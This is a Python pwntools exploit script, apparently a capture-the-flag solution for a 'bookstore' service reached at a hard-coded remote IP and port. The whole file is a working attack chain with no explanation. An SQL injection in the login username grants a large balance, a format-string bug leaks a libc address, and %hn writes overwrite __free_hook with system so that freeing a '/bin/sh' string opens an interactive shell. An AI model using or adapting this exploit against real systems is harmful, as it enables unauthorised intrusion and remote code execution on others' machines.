from pwn import *

#p = process('./bookstore')
p = remote('13.124.117.126', 31337)
libc = ELF('libc.so.6')

def choice(ch):
    p.recvuntil('Choice: ')
    p.sendline(str(ch))

def login(ch, user, pwd):
    choice(ch)
    p.recvuntil('Username: ')
    p.sendline(user)
    p.recvuntil('Password:')
    p.sendline(pwd)

login(1, "john', 'doe', 2000000000) --", 'lol')
login(2, 'john', 'doe')

choice(3)

def format(msg):
    p.recvuntil('>>')
    p.sendline('2')
    p.recvuntil('address:')
    p.sendline(msg)

format("[[[%p]")
p.recvuntil('[[[0x')
libc_base = int(p.recvuntil(']', drop=True), 16) - 0x3ec7e3
print(hex(libc_base))

start = 8 + 10
pad = 10 * 8

fmt = ''
addrs = []
written = 0

def write_at(addr, val):
    global written, addrs, fmt
    assert 0 <= val <= 0xffff
    addrs.append(addr)
    fmt += '%{}c%{}$hn'.format((val - written) & 0xffff, start + len(addrs) - 1)
    written = val

libc_system = libc_base + libc.symbols.system
libc_freehook = libc_base + libc.symbols['__free_hook']
write_at(libc_freehook, libc_system & 0xffff)
write_at(libc_freehook + 2, (libc_system >> 16) & 0xffff)
write_at(libc_freehook + 4, (libc_system >> 32) & 0xffff)

fmt = fmt.ljust(pad)
assert len(fmt) == pad
fmt += ''.join(map(p64, addrs))
assert(len(fmt) < 256)

print(hex(libc_freehook))
format(fmt)

p.recvuntil('>>')
p.sendline('3')

choice(4)
p.sendlineafter('Name:', '/bin/sh')
p.sendlineafter('Author:', '/bin/sh')
p.sendlineafter('Content:', '/bin/sh')

choice(3)
p.sendlineafter('>>', '1')
p.sendlineafter('sell:', '0')

p.interactive()
